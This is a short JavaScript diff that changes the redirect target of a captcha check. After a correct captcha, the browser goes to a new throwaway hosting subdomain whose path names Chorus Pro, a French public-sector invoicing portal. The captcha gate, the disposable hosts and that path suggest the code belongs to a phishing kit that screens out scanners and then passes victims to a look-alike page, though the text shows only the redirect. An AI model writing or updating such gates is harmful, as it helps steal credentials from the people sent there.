@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="http://2816697.bh523664.web.hosting-test.net/wop/pm/";
+        targetURL="http://2995239.bi551986.web.hosting-test.net/fk/choruspro/";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
